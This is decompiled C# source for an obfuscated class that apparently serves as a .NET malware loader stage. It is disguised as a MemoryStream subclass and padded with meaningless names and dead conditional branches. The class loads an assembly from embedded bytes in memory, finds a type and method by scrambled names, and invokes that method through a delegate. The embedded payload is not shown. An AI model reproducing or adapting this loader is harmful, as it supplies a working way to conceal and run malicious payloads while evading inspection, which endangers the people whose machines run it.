using System;
using System.IO;
using System.Linq;
using System.Reflection;

internal sealed class nlz : MemoryStream
{
	private static Func<Type, bool> mvo;

	public nlz()
	{
		_ = 0;
		if (5 == 0)
		{
		}
		base._002Ector();
	}

	internal void gkx()
	{
		Type[] types = ((Assembly)gky()).GetTypes();
		if (mvo == null)
		{
			Func<Type, bool> func = gla;
			if (uint.MaxValue != 0)
			{
				mvo = func;
			}
		}
		Type type = types.First(mvo);
		Type type2;
		if (7u != 0)
		{
			type2 = type;
		}
		MemberInfo[] members = type2.GetMembers();
		MemberInfo[] array;
		if (3u != 0)
		{
			array = members;
		}
		string text = "Vnnrcmpgbklbj";
		if (array[0].Name == text)
		{
			gkz(array[0]);
		}
		else if (array[1].Name == text)
		{
			gkz(array[1]);
		}
		else if (array[2].Name == text)
		{
			gkz(array[2]);
		}
		else if (array[3].Name == text)
		{
			gkz(array[3]);
		}
		else if (array[4].Name == text)
		{
			gkz(array[4]);
		}
	}

	internal object gky()
	{
		return Assembly.Load(nly.aip());
	}

	internal void gkz(object mlm)
	{
		Delegate @delegate = Delegate.CreateDelegate(typeof(Action), (MethodInfo)mlm);
		Delegate delegate2;
		if (8u != 0)
		{
			delegate2 = @delegate;
		}
		delegate2?.DynamicInvoke();
	}

	private static bool gla(Type mlm)
	{
		_ = 1;
		if (2 == 0)
		{
		}
		return mlm.FullName == "Rdyvcjsln.Cccdbpzncgwu";
	}
}
